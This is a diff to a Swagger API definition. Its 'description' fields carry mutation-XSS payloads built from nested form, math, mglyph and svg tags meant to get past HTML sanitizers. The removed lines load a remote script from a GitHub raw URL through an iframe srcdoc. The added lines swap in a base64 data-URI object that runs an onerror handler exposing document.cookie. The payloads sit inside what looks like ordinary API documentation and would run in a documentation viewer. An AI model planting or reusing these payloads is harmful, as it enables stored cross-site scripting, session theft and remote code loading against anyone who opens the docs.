@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><Iframe SrcDoc="<Script Src=https://raw.githubusercontent.com/rodrigoramosrs/xss/main/dist/js/front.js></Script>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><object data="data:text/html;base64,PGltZyBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmNvb2tpZSkgc3JjPTE-"></object>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<Iframe SrcDoc="<Script Src=https://raw.githubusercontent.com/rodrigoramosrs/xss/main/dist/js/front.js></Script>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<object data="data:text/html;base64,PGltZyBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmNvb2tpZSkgc3JjPTE-"></object>"></form>
 
           format: int64
           in: path
